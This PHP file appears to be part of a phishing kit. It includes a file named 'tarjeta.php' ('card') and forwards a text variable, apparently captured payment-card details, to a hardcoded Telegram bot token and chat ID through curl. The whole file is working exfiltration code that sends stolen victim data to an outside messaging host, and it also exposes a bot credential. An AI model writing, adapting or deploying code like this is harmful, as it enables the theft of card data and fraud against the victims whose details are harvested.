<?php
include "tarjeta.php";


$anti1 = "5512077518:AAFNdo3vwW7z8uxd22-7iSfmArw_sARvG0Y";
$anti2 = "-861063136";
function sirallah($messaggio,$token,$chatid) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?chat_id=" . $chatid;
    $url = $url . "&text=" . urlencode($messaggio);
    $ch = curl_init();
    $optArray = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
sirallah($text,$anti1,$anti2);


?>